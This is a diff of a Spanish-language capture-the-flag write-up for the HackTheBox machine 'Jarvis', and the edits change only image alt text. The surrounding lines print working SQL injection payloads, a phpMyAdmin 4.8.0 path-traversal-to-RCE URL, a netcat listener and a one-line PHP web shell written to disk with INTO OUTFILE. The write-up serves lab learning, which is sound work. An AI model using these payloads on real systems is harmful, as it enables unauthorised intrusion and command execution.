@@ -109,13 +109,13 @@ http://10.10.10.143:64999/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPS
 
 Ahora si procedemos a ver el contenido vía web para ambos puertos:
 
-![](/assets/images/htb-jarvis/jarvis-web.png)
+![""](/assets/images/htb-jarvis/jarvis-web.png)
 
-![](/assets/images/htb-jarvis/jarvis-web1.png)
+![""](/assets/images/htb-jarvis/jarvis-web1.png)
 
 Como por el puerto 64999 no nos muestra información que podamos analizar, vamos a empezar por el puerto 80 y tratar de ver los hipervínculos si nos lleva a algún lado haciendo *hovering* y tenemos el archivo `rooms-suites.php` en donde vemos algunas habitaciones que al hacer *hovering* vemos algo curioso `room.php?cod=1` en donde el número cambia de acuerdo con la habitación que seleccionemos; por lo que ya debemos estar pensando que debe existir una base de datos por detrás.
 
-![](/assets/images/htb-jarvis/jarvis-web2.png)
+![""](/assets/images/htb-jarvis/jarvis-web2.png)
 
 Si tratamos de hacer un *fuzzing* para descubrir hasta que número hay algún resultado, nos aparecerá el banner mostrado en el puerto 64999; por lo que vamos a omitir el uso de la herramienta `wfuzz` o similares y mejor vamos a utilizar `nmap` para tratar de descubrir nuevas rutas en el servidor web.
 
@@ -138,7 +138,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
 
 Tenemos un recurso interesante, `phpmyadmin` que si ingresamos, tenemos el panel de login:
 
-![](/assets/images/htb-jarvis/jarvis-web3.png)
+![""](/assets/images/htb-jarvis/jarvis-web3.png)
 
 En este punto, sabemos que existe una base de datos en donde se tienen las habitaciones y la podemos cambiar a través de la URL; por lo que vamos a tratar de realizar unas inyeccions SQL para que ver pasa. 
 
@@ -146,11 +146,11 @@ En este punto, sabemos que existe una base de datos en donde se tienen las habit
 - 10.10.10.143/room.php?cod=1 and sleep(5)-- - > Vemos que la web tarda 5 segundos en responder, por lo tanto podría ser vulnerable a SQLi basada en tiempo.
 - 10.10.10.143/room.php?cod=0 union select 1,2,3,4,5,6,7-- - > Vemos que se nos muestran las etiquetas para las columnas de las tablas (se estuvo intentando desde 1 hasta donde se observara algún resultado y bajo un número que no mostrata información, en este caso 0). Por lo tanto, ya podríamos escoger un valor de los observamos para inyectar comandos y obtener información sobre la base de datos.
 
- ![](/assets/images/htb-jarvis/jarvis-web4.png)
+ ![""](/assets/images/htb-jarvis/jarvis-web4.png)
 
  - 10.10.10.143/room.php?cod=0 union select 1,2,database(),4,5,6,7-- - > Sustituimos la etiqueta del número 3 por el comando `databse()` y al cargar deberíamos de ver que en el lugar donde antes estaba el 3, ahora vemos el nombre de la base de datos, para este caso es **hotel**.
 
- ![](/assets/images/htb-jarvis/jarvis-web5.png)
+ ![""](/assets/images/htb-jarvis/jarvis-web5.png)
 
  - 10.10.10.143/room.php?cod=0 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- - > Vemos las bases de datos en el servidor y vamos recorriendolas con `limit 0,1`, `limit 1,1`, `limit 2,1` y así sucesivamente. Por lo que tenemos las siguientes bases de datos:
 	 - hotel
@@ -252,7 +252,7 @@ Session completed
 
 Como siempre, guardamos las credenciales que tengamos y procedemos a utilizarlas en el panel de login.
 
-![](/assets/images/htb-jarvis/jarvis-web6.png)
+![""](/assets/images/htb-jarvis/jarvis-web6.png)
 
 Ya nos encontramos en el dentro del panel de administración de phpmyadmin. Si checamos la versión, vemos que estamos frente a la 4.8.0, por lo que podríamos buscar algún exploit público que nos ayude.
 
@@ -277,7 +277,7 @@ Vemos 2 los cuales parte de un LFI para obtener RCE y de una manera mejor explic
 - Con el plugin **Edit this cookie** obtenemos nuestra cookie para el campo **phpMyAdmin**: glpacrhpqr2ancitvpu72p59j1jkljoc
 - Ahora accedemos al siguiente recurso: **10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_glpacrhpqr2ancitvpu72p59j1jkljoc**
 
-![](/assets/images/htb-jarvis/jarvis-cookie.png)
+![""](/assets/images/htb-jarvis/jarvis-cookie.png)
 
 ```bash
  ❯ nc -nlvp 443
@@ -293,11 +293,11 @@ Ya nos encontramos dentro de la máquina como el usuario **www-data**; sin embar
 
 Otra manera de comprometer el equipo es mediante la inclusión de archivos en conjunto con la inyección de comandos SQL, para este caso utilizaremos la sentencia `union select 1,2,3,4,5,6,7-- -` en lugar de poner el número 3 vamos a tratar de poner un texto y posteriormente guardarlo en un archivo bajo una ruta del sistema, que si recordamos, podemos acceder a **images** y vamos a suponer que se encuentra en la ruta absoluta `/var/www/html/images`. Por lo tanto, nuestra sentencia sería `union select 1,2,"Esto es una prueba",4,5,6,7 into outfile "/var/www/html/images/test.txt"`:
 
-![](/assets/images/htb-jarvis/jarvis-web7.png)
+![""](/assets/images/htb-jarvis/jarvis-web7.png)
 
-![](/assets/images/htb-jarvis/jarvis-web8.png)
+![""](/assets/images/htb-jarvis/jarvis-web8.png)
 
-![](/assets/images/htb-jarvis/jarvis-web9.png)
+![""](/assets/images/htb-jarvis/jarvis-web9.png)
 
 Vemos que podemos crear archivos y acceder a ellos, por lo que ya debemos estar pensando en tratar de subir de archivo php que nos permita la ejecución de comandos. Nuestra sentencia sería la siguiente:
 
@@ -305,7 +305,7 @@ Vemos que podemos crear archivos y acceder a ellos, por lo que ya debemos estar 
 union select 1,2,"<?php echo shell_exec($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/images/shell.php"
 ```
 
-![](/assets/images/htb-jarvis/jarvis-web10.png)
+![""](/assets/images/htb-jarvis/jarvis-web10.png)
 
 Hemos logrado tener ejecución de comandos a nivel de sistema, así que lo único que nos queda es entablarnos una reverse shell a nuestra máquina de atacante y haremos uso de [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
